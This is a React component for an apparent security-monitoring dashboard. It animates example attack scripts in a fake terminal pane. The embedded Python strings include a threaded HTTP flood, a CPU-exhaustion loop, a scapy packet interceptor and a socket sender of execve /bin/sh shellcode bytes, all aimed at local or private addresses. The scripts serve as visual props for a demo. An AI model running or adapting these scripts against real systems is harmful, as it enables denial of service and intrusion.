'use client'

import { DashboardState } from '@/app/page'
import { useEffect, useState } from 'react'

interface AttackCodeViewerProps {
  state: DashboardState
}

const ATTACK_SCRIPTS: Record<string, string> = {
  ddos: `# DDoS High-Volume Request Injector
import requests
import threading
import time

TARGET_URL = "http://edge-node-01.local:8080/api/telemetry"
NUM_THREADS = 500
RUNNING = True

def send_spam_requests():
    while RUNNING:
        try:
            requests.get(TARGET_URL, timeout=1.5)
        except requests.exceptions.RequestException:
            pass

print(f"[*] Launching Layer 7 DDoS against {TARGET_URL}")
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=send_spam_requests)
    t.start()
    threads.append(t)

try:
    time.sleep(60) # Run for 60 seconds
except KeyboardInterrupt:
    RUNNING = False
`,
  mitm: `# MITM Latency & Packet Dropper
from scapy.all import *
import time

TARGET_IP = "192.168.1.105"
GATEWAY_IP = "192.168.1.1"

def intercept_traffic(packet):
    # Simulate network congestion by sleeping
    time.sleep(0.5) 
    
    # Drop 8% of packets
    if random.randint(1, 100) <= 8:
        print("[!] Dropped packet from stream")
        return None
        
    return packet

print(f"[*] Sniffing and manipulating traffic for {TARGET_IP}")
# Intercepting traffic on wlan0
sniff(filter=f"host {TARGET_IP}", prn=intercept_traffic, store=0)
`,
  anomaly: `# CPU/Memory Exhaustion Exploit (Anomaly)
import multiprocessing
import math

def cpu_intensive_task():
    while True:
        math.factorial(5000)

print("[*] Deploying CPU/Memory exhaustion payload")
processes = []
# Spawn processes across all CPU cores
for i in range(multiprocessing.cpu_count()):
    p = multiprocessing.Process(target=cpu_intensive_task)
    p.start()
    processes.append(p)

print("[*] Payload active. Maxing out Node utilization.")
`,
  unknown: `# Zero-Day Exploit: Unrecognized Signature
import socket
import binascii

# Encrypted polymorphic payload
PAYLOAD_HEX = "414141410A90909090CC31C050682F2F7368682F62696E89E3505389E1B00B"
SHELLCODE = binascii.unhexlify(PAYLOAD_HEX)

TARGET_IP = "192.168.1.105"
TARGET_PORT = 443

try:
    print(f"[*] Exploiting unknown vulnerability on {TARGET_IP}:{TARGET_PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    
    # Injecting anomalous shellcode bypassing current IPS rules
    s.send(SHELLCODE)
    print("[+] Exploit deployed successfully. Anomalous connection maintained.")
except Exception as e:
    print(f"[-] Exploit failed: {e}")
`
}

export default function AttackCodeViewer({ state }: AttackCodeViewerProps) {
  const [displayedCode, setDisplayedCode] = useState<string>('# Awaiting attack injection...')
  const [typingIndex, setTypingIndex] = useState(0)
  const currentAttack = state.attack_type?.toLowerCase() || ''

  useEffect(() => {
    let scriptToType = '# Monitoring network layer... System nominal.'
    
    if (currentAttack && currentAttack !== 'unknown' && ATTACK_SCRIPTS[currentAttack]) {
      scriptToType = ATTACK_SCRIPTS[currentAttack]
    } else if (currentAttack === 'unknown' || state.ml_status === 'FAILURE') {
      scriptToType = ATTACK_SCRIPTS['unknown'] || ATTACK_SCRIPTS['anomaly']
    } else if (state.root_cause === 'Request rate spike') {
      scriptToType = ATTACK_SCRIPTS['ddos']
    } else if (state.root_cause === 'Network instability') {
      scriptToType = ATTACK_SCRIPTS['mitm']
    } else if (state.root_cause === 'Compute overload') {
      scriptToType = ATTACK_SCRIPTS['anomaly']
    }

    // Reset typing animation
    setDisplayedCode('')
    setTypingIndex(0)
    
    let currentString = ''
    let charIndex = 0

    const typingInterval = setInterval(() => {
      if (charIndex < scriptToType.length) {
        currentString += scriptToType.charAt(charIndex)
        setDisplayedCode(currentString)
        charIndex++
      } else {
        clearInterval(typingInterval)
      }
    }, 5) // Fast typing effect

    return () => clearInterval(typingInterval)
  }, [currentAttack, state.root_cause, state.ml_status])

  return (
    <div className="cyber-border rounded-lg p-0 overflow-hidden bg-[#0d1117] relative lg:col-span-2 flex flex-col h-full">
      <div className="flex items-center justify-between px-4 py-2 bg-[#161b22] border-b border-border/50">
        <div className="flex items-center space-x-2">
          <div className="flex space-x-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500/80"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/80"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-green-500/80"></div>
          </div>
          <p className="text-xs font-mono text-muted-foreground ml-3">live_exploit.py</p>
        </div>
        <p className="text-xs font-semibold uppercase tracking-wider text-cyan-400 animate-pulse">
           Python Runtime
        </p>
      </div>

      <div className="p-4 overflow-auto font-mono text-xs sm:text-sm text-gray-300 flex-grow max-h-[300px] scrollbar-thin scrollbar-thumb-cyan-500/30">
        <pre className="whitespace-pre-wrap">
          <code className="text-green-400">
            {displayedCode}
            <span className="inline-block w-2 h-4 bg-cyan-400 ml-1 animate-pulse align-middle"></span>
          </code>
        </pre>
      </div>
    </div>
  )
}
